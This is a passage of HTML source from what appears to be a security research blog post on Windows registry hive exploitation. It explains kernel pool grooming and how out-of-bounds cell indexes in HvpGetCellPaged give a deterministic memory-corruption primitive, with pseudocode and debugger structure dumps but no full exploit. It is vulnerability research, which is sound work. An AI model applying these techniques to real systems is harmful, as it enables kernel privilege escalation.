 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Pooltag&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Gpbm&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;GDITAG_POOL_BITMAP_BITS,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Binary&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;win32k.sys&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;The next two memory pages correspond to other, completely unrelated allocations on the pool: one associated with the NT Object Manager, and the other with the win32k.sys graphics driver. This clearly demonstrates that in the kernel space, areas containing volatile hive data are mixed with various other allocations used by other parts of the system. Moreover, this technique is attractive because it not only enables out-of-bound writes of controlled data, but also the ability to read this OOB data beforehand. Thanks to this, the exploit does not have to operate &amp;quot;blindly&amp;quot;, but it can precisely verify whether the memory is arranged exactly as expected before proceeding with the next stage of the attack. With these kinds of capabilities, writing the rest of the exploit should be a matter of properly grooming the pool layout and finding some good candidate objects for corruption.&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;ormwWEjHLs-c31&quot; id=&quot;h.hslxr5bxlwwp&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c38&quot;&gt;The ultimate primitive: out-of-bounds cell indexes&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;T&lt;/span&gt;&lt;span&gt;he situation is clearly not as hopeless as it might have seemed earlier&lt;/span&gt;&lt;span&gt;, and t&lt;/span&gt;&lt;span&gt;here are quite a few ways to convert memory corruption in one&amp;#39;s own hive space into taking control of other types of memory.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;All of them, however, have one minor flaw: they rely on prearranging a specific layout of objects in memory (e.g., hive mappings in the Registry process, or allocations on the paged pool), which means they &lt;/span&gt;&lt;span&gt;cannot be said to be 100% &lt;/span&gt;&lt;span&gt;stable or deterministic.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The randomness of the memory layout carries the inherent risk that either the exploit simply won&amp;#39;t work, or worse, it will crash the operating system in the process.&lt;/span&gt;&lt;span&gt;&amp;nbsp;F&lt;/span&gt;&lt;span&gt;or lack of better alternatives, these techniques would be sufficient, especially for demonstration purposes.&lt;/span&gt;&lt;span&gt;&amp;nbsp;However&lt;/span&gt;&lt;span&gt;, I found a better method that guarantees 100% effectiveness by completely eliminating the element of randomness.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;I have hinted at or even directly mentioned this many times in previous blog posts in this series, and I am, of course, referring to out-of-bounds cell indexes.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;As a quick reminder, cell indexes are the hive&amp;#39;s equivalent of pointers: they are 32-bit values that allow allocated cells to reference each other.&lt;/span&gt;&lt;span&gt;&amp;nbsp;T&lt;/span&gt;&lt;span&gt;he translation of cell indexes into their corresponding virtual addresses is achieved using a special 3-level structure called a &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c21&quot;&gt;cell map&lt;/span&gt;&lt;span&gt;, which resembles a CPU page table&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx4phbfruw7m0YiPho7M9QaWIl7XOHAdG-xGa0r2kIs8vTKMLKXclhTG1XAgbBqrQeE4XmeiswpqR36En3Mh0_czbx4urYPiVUTD1YxQxQgTgp1ni1jJgy0XcyZ-Y0pVO9Veivukbpc8dpQ4Mz_EOZkLavUBpIQ-ciQoQL_SRBJubBM92RTzhW1jxjOyY/s1999/image14.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjx4phbfruw7m0YiPho7M9QaWIl7XOHAdG-xGa0r2kIs8vTKMLKXclhTG1XAgbBqrQeE4XmeiswpqR36En3Mh0_czbx4urYPiVUTD1YxQxQgTgp1ni1jJgy0XcyZ-Y0pVO9Veivukbpc8dpQ4Mz_EOZkLavUBpIQ-ciQoQL_SRBJubBM92RTzhW1jxjOyY/s1200/image14.png&quot; border=&quot;0&quot; alt=&quot;A diagram of a cell map&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;A diagram of a cell map&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The C-like pseudocode of the internal HvpGetCellPaged function responsible for performing the cell map walk is presented below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_CELL_DATA&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*HvpGetCellPaged(_HHIVE&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*Hive,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;HCELL_INDEX&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Index)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HMAP_ENTRY&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;*Entry&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;Hive-&amp;gt;Storage[Index&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;31].Map&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;-&amp;gt;Directory[(Index&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;21)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x3FF]&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;-&amp;gt;Table[(Index&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;12)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0x1FF];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(Entry-&amp;gt;PermanentBinAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(~0xF))&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Entry-&amp;gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;(Index&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0xFFF)&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;4;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;The structures corresponding to the individual levels of the cell map are _DUAL, _HMAP_DIRECTORY, _HMAP_TABLE and _HMAP_ENTRY, and they are accessible through the _CMHIVE.Hive.Storage field.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;From an exploitation perspective, two facts are crucial here.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;First, the HvpGetCellPaged function does not perform any bounds checks on the input index.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Second, for hives smaller than 2 MiB, Windows applies an additional optimization called &amp;quot;small dir&amp;quot;. In that case, instead of allocating the entire Directory array of 1024 elements and only using one of them, the kernel sets the _CMHIVE.Hive.Storage[...].Map pointer to the address of the _CMHIVE.Hive.Storage[...].SmallDir field, which simulates a single-element array.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;In this way, the number of logical cell map levels remains the same, but the system uses one less pool allocation to store them, saving about 8 KiB of memory per hive.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This behavior is shown in the screenshot below:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhA9LxhP9Ci2epQatt60JORm0-L0yaspLxz3TAiZYaO0CUjvNQV-IlU05GdBXA2zDoZizlxUnGVDAmzmSXMe4XWYvTfFNZmSlkOmxcSOVuE0PQVkvB_l7z6kCSyTqHAsH46yAiyf1i55BWeoIgyFzkIN3XbILWyZobLcQRb3zdWVQua5WZUyo6Sgy_yRu8/s696/image3.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhA9LxhP9Ci2epQatt60JORm0-L0yaspLxz3TAiZYaO0CUjvNQV-IlU05GdBXA2zDoZizlxUnGVDAmzmSXMe4XWYvTfFNZmSlkOmxcSOVuE0PQVkvB_l7z6kCSyTqHAsH46yAiyf1i55BWeoIgyFzkIN3XbILWyZobLcQRb3zdWVQua5WZUyo6Sgy_yRu8/s696/image3.png&quot; border=&quot;0&quot; alt=&quot;Screenshot&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Screenshot&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;What we have here is a hive that has a stable storage area of 0xEE000 bytes (952 KiB) and a volatile storage area of 0x5000 bytes (20 KiB). Both of these sizes are smaller than 2 MiB, and consequently, the &amp;quot;small dir&amp;quot; optimization is applied in both cases.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;As a result, the Map pointers (marked in orange) point directly to the SmallDir fields (marked in green).&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c36 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;This situation is interesting because if the kernel attempts to resolve an invalid cell index with a value of 0x200000 or greater (i.e., with the &amp;quot;Directory index&amp;quot; part being non-zero) in the context of such a hive, then the first step of the cell map walk will reference the out-of-bounds Guard, FreeDisplay, etc. fields as pointers.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This situation is illustrated in the diagram below&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOSvTNN7d90cVOx0Lst3xlCz_5EtCvN6sbDnrCQvO5mW8ikaOoWGIKvNXzPLqfhZ9RYhnZtpzQBOeXfUb5Qjv3ENnXBwTPEjDrOaQropnw9X1WvOolOH4ih4q0xNgH0hyTJ2gZQXO3OBVUy8rkNP6Ce1VHaFNH_AO-0qeftPTPDtVU4PISX7aR_go7J2A/s1106/image21.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiOSvTNN7d90cVOx0Lst3xlCz_5EtCvN6sbDnrCQvO5mW8ikaOoWGIKvNXzPLqfhZ9RYhnZtpzQBOeXfUb5Qjv3ENnXBwTPEjDrOaQropnw9X1WvOolOH4ih4q0xNgH0hyTJ2gZQXO3OBVUy8rkNP6Ce1VHaFNH_AO-0qeftPTPDtVU4PISX7aR_go7J2A/s1106/image21.png&quot; border=&quot;0&quot; alt=&quot;Diagram described above&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram described above&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;In other words, by fully controlling the 32-bit value of the cell index, we can make the translation logic jump through two pointers fetched from out-of-bounds memory, and then add a controlled 12-bit offset to the result.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;An additional consideration is that in the first step, we reference OOB indexes of an &amp;quot;array&amp;quot; located inside the larger _CMHIVE structure, which always has the same layout on a given Windows build.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, by choosing a directory index that references a specific pointer in _CMHIVE, we can be sure that it will always work the same way on a given version of the system, regardless of any random factors.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;On the other hand, a small inconvenience is that the _HMAP_ENTRY structure (i.e., the last level of the cell map) has the following layout:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kd&amp;gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;dt&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;_HMAP_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;nt!_HMAP_ENTRY&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+0x000&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;BlockOffset&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Uint8B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+0x008&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;PermanentBinAddress&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Uint8B&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;+0x010&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;MemAlloc&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Uint4B&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;And t&lt;/span&gt;&lt;span&gt;he final returned value is the sum of the BlockOffset and PermanentBinAddress fields.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;Therefore, if one of these fields contains the address we want to reference, the other must be NULL, which may slightly narrow down our options.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;I&lt;/span&gt;&lt;span&gt;f we were to create a graphical representation of the relationships between structures based on the pointers they contain,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;starting from _CMHIVE, it would look something like the following:&lt;/span&gt;&lt;/p&gt;
